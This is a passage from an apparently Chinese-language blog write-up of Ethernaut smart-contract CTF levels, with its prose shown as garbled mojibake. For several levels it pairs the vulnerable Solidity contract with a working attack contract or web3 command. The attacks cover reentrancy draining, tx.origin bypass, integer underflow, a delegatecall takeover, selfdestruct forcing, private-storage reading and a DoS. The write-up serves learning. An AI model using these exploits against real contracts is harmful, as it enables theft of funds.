0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_win() public view returns(uint256)&#123;</span><br><span class="line">        return consecutiveWins;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    CoinFlip target = CoinFlip(0x3A32669799018d0dc834401e6B6a31f4499819cB);</span><br><span class="line">    // CoinFlip target = CoinFlip(0x93f8dddd876c7dBE3323723500e83E202A7C96CC);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() payable public returns(bool)&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        bool guess = uint256(blockValue / FACTOR) == 1 ? true : false;</span><br><span class="line">        return target.flip(guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ³¨æ„çš„æ˜¯é¢˜ç›®åˆçº¦ä¸­å¯¹æ¯æ¬¡å‘èµ·äº¤æ˜“æ—¶æ‰€åœ¨çš„åŒºå—æœ‰è¦æ±‚ æˆ‘ä»¬è‡³å°‘è¦è°ƒç”¨<code>contract.flip()</code>10æ¬¡ è€Œæ¯æ¬¡å‘èµ·äº¤æ˜“ä¸èƒ½è®©äº¤æ˜“åœ¨ä¹‹å‰å®Œæˆè¿‡äº¤æ˜“çš„åŒºå—ä¸Šå®Œæˆ æ‰€ä»¥ä¸èƒ½ç›´æ¥å¾ªç¯10æ¬¡è°ƒç”¨ç›®æ ‡å‡½æ•° åæ­£æˆ‘æ˜¯è‡ªå·±ç‚¹äº†10æ¬¡<code>attack()</code>çš„(</p>
<h3 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h3><p>è¿™é¢˜ä¸»è¦æ˜¯è®©æˆ‘ä»¬åŒºåˆ†<code>msg.sender</code>å’Œ<code>tx.origin</code>  åè€…è®°å½•çš„æ˜¯è°ƒç”¨é“¾çš„æºå¤´ è€Œå‰è€…è®°å½•çš„æ˜¯ç›´æ¥å‘èµ·äº¤æ˜“çš„å¯¹è±¡</p>
<p>ä¾‹å¦‚å¤–éƒ¨è´¦æˆ·Aé€šè¿‡è°ƒç”¨å·²éƒ¨ç½²çš„åˆçº¦Bè°ƒç”¨äº†å¦ä¸€ä¸ªåˆçº¦C é‚£ä¹ˆè¿™ç¬”äº¤æ˜“çš„<code>tx.origin</code>æ˜¯address(A) è€Œ<code>msg.sender</code>æ˜¯address(B)</p>
<p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦æˆ‘ä»¬é€šè¿‡åˆçº¦æ¥è°ƒç”¨ç›®æ ‡åˆçº¦å°±èƒ½è¾¾æˆ<code>tx.origin != msg.sender</code>äº†:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Middle &#123;</span><br><span class="line">    Telephone target = Telephone(address(0x8634C2E372B1d8b509CE8B503356e9E5B45bab2a));</span><br><span class="line">    // Telephone target = Telephone(address(0x86cA07C6D491Ad7A535c26c5e35442f3e26e8497));</span><br><span class="line">    function caller(address _owner) public &#123;</span><br><span class="line">        target.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>è¿™é¢˜æ˜¯ä¸ºäº†è®©æˆ‘ä»¬äº†è§£Solidityçš„æ•°æ®æº¢å‡º</p>
<p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æè¿°ä¸­è¯´<code>player</code>çš„ä½™é¢åˆå§‹åŒ–ä¸º20 é€šå…³è¦æ±‚æ˜¯è®©å®ƒå¤§äº20 è¿™é‡Œç”¨ç±»ä¼¼Cçš„æ•°æ®æº¢å‡ºæ¥bypass <code>balances[msg.sender] - _value &gt;= 0</code> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((-<span class="number">0x666666</span> + <span class="number">20</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9999ae&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨ä»¥ä¸‹åˆçº¦è°ƒç”¨ç›®æ ‡å‡½æ•°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0, &quot;balance too low&quot;);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GetToken &#123;</span><br><span class="line">    address public player = address(0x03741c1792729798cFb7d21554a90EFb57E6b278);</span><br><span class="line">    Token public target = Token(address(0x98Fa9020E34784b482981Ddf097da56a3e97E632));</span><br><span class="line">    uint256 public to_sub = uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9999ae);</span><br><span class="line">    function gtoken() public &#123;</span><br><span class="line">        target.transfer(&#123;_to : player, _value : to_sub&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h3><p>è¿™é¢˜ä¸»è¦æ˜¯è¦æˆ‘ä»¬äº†è§£å‡½æ•°çš„<a href="https://solidity-by-example.org/call/">ä½çº§è°ƒç”¨æ–¹å¼</a></p>
<p>.callå’Œ.delegatecallçš„ç”¨æ³•éƒ½æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success, bytes memory data) = targetContract.[delegate]call&#123;value: 1 ether&#125;(</span><br><span class="line">    abi.encodeWithSignature(&quot;functionName(uint256)&quot;, arg1)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>targetContract</code> æ˜¯è¦è°ƒç”¨çš„åˆçº¦åœ°å€</li>
<li><code>&#123;value: 1 ether&#125;</code> ä»£è¡¨è°ƒç”¨æ—¶é™„å¸¦ 1 ETH(å¯é€‰ é™¤æ­¤ä¹‹å¤–è¿˜èƒ½æŒ‡å®š<code>gas</code>)</li>
<li><code>abi.encodeWithSignature(&quot;functionName(uint256)&quot;, arg1)</code> ç”¨äºç¼–ç è¦è°ƒç”¨çš„å‡½æ•°åå’Œå‚æ•°</li>
<li><code>success</code> è¡¨ç¤ºè°ƒç”¨æ˜¯å¦æˆåŠŸ</li>
<li><code>data</code> æ˜¯è°ƒç”¨è¿”å›çš„åŸå§‹æ•°æ®</li>
</ul>
<p>åŒºåˆ«æ˜¯ä¸€ä¸ªæ˜¯åœ¨ç›®æ ‡åˆçº¦çš„å†…å­˜åŒºæ‰§è¡Œä¸€ä¸ªæ˜¯åœ¨æœ¬åœ°å†…å­˜åŒºæ‰§è¡Œ <code>.call</code>ç›¸å½“äºæ‰§è¡Œé¶æœºä¸Šçš„ç¨‹åº ä¿®æ”¹äº†å“ªäº›å€¼éƒ½åªåœ¨é¶æœºä¸Šè¿›è¡Œäº†ä¿®æ”¹ <code>.delegatecall</code>ç›¸å½“äºæ‹‰å–é¶æœºçš„ä»£ç åˆ°æœ¬åœ°æ¥æ‰§è¡Œ ä¿®æ”¹äº†å“ªäº›å€¼éƒ½ä¼šä½“ç°åœ¨æœ¬åœ°çš„å€¼ä¸Š</p>
<p>å› æ­¤å¦‚æœè¦ä½¿ç”¨<code>.delegatecall</code>è¦ç¡®ä¿ç›®æ ‡å‡½æ•°ä¸­ç”¨åˆ°çš„å€¼åœ¨æœ¬åœ°ä¹Ÿæœ‰</p>
<p>æœ¬é¢˜åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥å‘ç›®æ ‡åˆçº¦å‘èµ·å¸¦æœ‰è¢«ç­¾åç¼–ç äº†çš„<code>&#39;pwn()&#39;</code>çš„è½¬è´¦æ¥è§¦å‘<code>fallback()</code>å¹¶å°†<code>Delegate</code>åˆçº¦ä¸­çš„pwnæ‹‰åˆ°ç›®æ ‡åˆçº¦ä¸Šæ‰§è¡Œæ¥è·å–æ§åˆ¶æƒ:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:instance, <span class="attr">data</span>:web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;pwn()&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><p>æœ¬é¢˜åˆçº¦ä¸ºç©ºåˆçº¦ é€šå…³è¦æ±‚æ˜¯å‘åˆçº¦è½¬å…¥æµ‹è¯•å¸ ä½†æ˜¯ç©ºåˆçº¦æ²¡æœ‰payableä¿®é¥°çš„å‡½æ•° è¿™å°±è¦ç”¨åˆ°<a href="https://solidity-by-example.org/hacks/self-destruct/"><code>selfdestruct()</code>å¼ºåˆ¶è½¬è´¦</a>äº† å½“ä¸€ä¸ªåˆçº¦è°ƒç”¨<code>selfdestruct()</code>è‡ªæ¯æ—¶å¯ä»¥å‘è¿™ä¸ªå‡½æ•°ä¼ å…¥ä¸€ä¸ªåœ°å€ è¿™ä¼šä½¿åˆçº¦è‡ªæ¯åå°†åˆçº¦çš„ä½™é¢å¼ºåˆ¶è½¬å…¥è¿™ä¸ªåœ°å€ä¸­</p>
<p>æ”»å‡»åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;</span><br><span class="line">    function get_balance () public view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">     /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =Ã¸= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    Force target;</span><br><span class="line">    constructor (address _target) payable &#123;</span><br><span class="line">        target = Force(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">    function hack () payable public&#123;</span><br><span class="line">        address payable to_hack = payable(address(target));</span><br><span class="line">        selfdestruct(to_hack);</span><br><span class="line">    &#125;</span><br><span class="line">    function get_balance () public view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»åˆçº¦çš„æ„é€ å‡½æ•°è¢«payableä¿®é¥° éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶å¯ä»¥ç›´æ¥è½¬å…¥ä½™é¢:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F10%2F20250210-113422.png" alt="image-20250210113414449"></p>
<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>è¿™é¢˜ä¸»è¦æ˜¯è¦æˆ‘ä»¬äº†è§£<a href="https://solidity-by-example.org/hacks/accessing-private-data/">Solidityçš„æ•°æ®å‚¨å­˜ç­–ç•¥</a></p>
<p>ç®€å•æ¥è¯´ å†…å­˜å¯¹é½32bytes æ™®é€šçš„åŸºæœ¬ç±»å‹<strong>å˜é‡</strong>æŒ‰ç…§å£°æ˜é¡ºåºå‚¨å­˜ å‚¨å­˜æ™®é€šåŸºæœ¬ç±»å‹å˜é‡çš„æ•°ç»„è¿ç»­å‚¨å­˜ å‚¨å­˜ç»“æ„ä½“çš„æ•°ç»„åœ¨å½“å‰å†…å­˜å•å…ƒå­˜å…¥å½“å‰å†…å­˜å•å…ƒçš„<code>index</code> å‡è®¾ç»“æ„ä½“é•¿åº¦ä¸º<code>len * 32bytes</code> åˆ™æ•°ç»„ä¸­ç¬¬<code>n</code>ä¸ªç»“æ„ä½“å‚¨å­˜åœ¨ç¬¬ <code>keccak256(abi.encodePacked(index)) + len * n</code> ä¸ªå†…å­˜å•å…ƒ</p>
<p>å­—å…¸ç±»å‹å’Œå‚¨å­˜ç»“æ„ä½“çš„æ•°ç»„å”¯äºŒçš„ä¸åŒå°±æ˜¯å½“å‰å†…å­˜å•å…ƒä¸‹æ ‡<code>index</code>ä¸ä¼šå‚¨å­˜åœ¨å†…å­˜ä¸­ ä»¥åŠ<code>key</code>å¯¹åº”çš„å…ƒç´ å‚¨å­˜åœ¨ç¬¬ <code>keccak256(abi.encodePacked(key, index)) + len * n</code> ä¸ªå†…å­˜å•å…ƒ</p>
<p>äº†è§£äº†è¿™äº›çŸ¥è¯†å†çœ‹é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åªè¦æ‰¾åˆ°<code>password</code>å­˜æ”¾çš„å†…å­˜å•å…ƒä¸‹æ ‡å°±èƒ½è·å¾—å…¶å€¼äº†:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(<span class="string">&quot;0xbBA87c681331afbfA03242D1054810e298b511eC&quot;</span>, <span class="number">1</span>, <span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨æ˜¯(ç›®æ ‡åˆçº¦åœ°å€, å†…å­˜å•å…ƒä¸‹æ ‡, è¾“å‡ºæµ)</p>
<h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šå…³è¦æ±‚æ˜¯è®©å…¶ä»–å¤–éƒ¨ç”¨æˆ·æ— æ³•å†æˆä¸ºå›½ç‹ è¿™é‡Œçš„ä¸€ä¸ªæ¼æ´ç‚¹æ˜¯æ–°å›½ç‹ä¸Šä½æˆåŠŸé™¤äº†å‘é€é‡‘é¢å¤§äºç­‰äºå½“å‰å›½ç‹å¤–è¿˜æœ‰<code>payable(king).transfer(msg.value);</code>è¿™æ¡è¯­å¥æ‰§è¡ŒæˆåŠŸ Solidityæœ‰äº¤æ˜“å›æ»šæœºåˆ¶ åœ¨å‘èµ·äº¤æ˜“æ—¶å°†å½“å‰çŠ¶æ€å¤åˆ¶ä¸€ä»½åˆ°è™šæ‹Ÿç¯å¢ƒä¸­ç„¶ååœ¨è™šæ‹Ÿç¯å¢ƒä¸­æ‰§è¡Œè°ƒç”¨çš„å‡½æ•° å¦‚æœå‡½æ•°åœ¨ä¸­é—´æ‰§è¡Œå¤±è´¥å°±ç›¸å½“äºæ— äº‹å‘ç”Ÿ åªæœ‰å‡½æ•°æ•´ä¸ªæ‰§è¡Œå®Œæ‰ä¼šå‘ç”ŸçŠ¶æ€çš„æ”¹å˜ è¿™é‡Œæˆä¸ºæ–°å›½ç‹ä¾èµ–äºèƒ½æˆåŠŸå‘å½“å‰å›½ç‹å‘é€é‡‘é¢ å¦‚æœå½“å‰å›½ç‹å¹¶éä¸€ä¸ªå¤–éƒ¨è´¦æˆ·è€Œæ˜¯ä¸€ä¸ªåˆçº¦è´¦æˆ· è€Œè¿™ä¸ªåˆçº¦è´¦æˆ·æ²¡æœ‰æ¥æ”¶è¿”è¿˜æ¬¾çš„<code>fallback</code>å‡½æ•°å°±ä¼šä½¿æ‰€æœ‰æˆä¸ºæ–°å›½ç‹çš„è¯·æ±‚éƒ½åœ¨è¿”è¿˜æ¬¾è¿™ä¸€æ­¥å¤±è´¥</p>
<p>é¢˜è§£:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DOS&#123;</span><br><span class="line">    King target;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor(address _target) payable &#123;</span><br><span class="line">        target = King(payable(_target));</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() payable public &#123;</span><br><span class="line">        payable(address(target)).call&#123;value: 1200000000000000 wei&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external payable &#123;</span><br><span class="line">        payable(owner).transfer(payable(address(this)).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éƒ¨ç½²å‰è¦å…ˆæŸ¥è¯¢<code>King.prize</code>æ¥å†³å®šå‘é€å¤šå°‘æµ‹è¯•å¸</p>
<h3 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h3><p>é¢˜å¦‚å…¶å è¦ç”¨é‡å…¥æ”»å‡»</p>
<p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨é‡å…¥æ”»å‡»çš„ç‚¹åœ¨äº<code>withdraw()</code>åœ¨æ›´æ–°çŠ¶æ€å‰å°±è¿›è¡Œäº†å®é™…ææ¬¾æ“ä½œ åªè¦åœ¨<code>fallback</code>ä¸­ç»§ç»­è°ƒç”¨<code>withdraw</code>å°±èƒ½æå–æ‰€æœ‰ä½™é¢:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to] + (msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Reentrance public target;</span><br><span class="line">    uint256 public Amount = 0.2 ether;</span><br><span class="line">    constructor(address _target) public payable &#123;</span><br><span class="line">        target = Reentrance(payable (_target));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        target.withdraw(address(target).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        target.donate&#123;value:0.2 ether&#125;(address(this));</span><br><span class="line">        target.withdraw(Amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        payable(address(0x03741c1792729798cFb7d21554a90EFb57E6b278)).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h3><p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ä¼šè°ƒç”¨ç”¨æˆ·å®ç°çš„<code>Building.isLastFloor()</code> è¦æ±‚åŒæ ·çš„å‚æ•°ä¸¤æ¬¡è°ƒç”¨è¿”å›ä¸åŒçš„å€¼ ç›´æ¥è®¾ç½®ä¸€ä¸ªçŠ¶æ€è®°å½•è°ƒç”¨æ¬¡æ•°æ¥è¿”å›ä¸åŒå€¼å°±è¡Œäº†:</p>
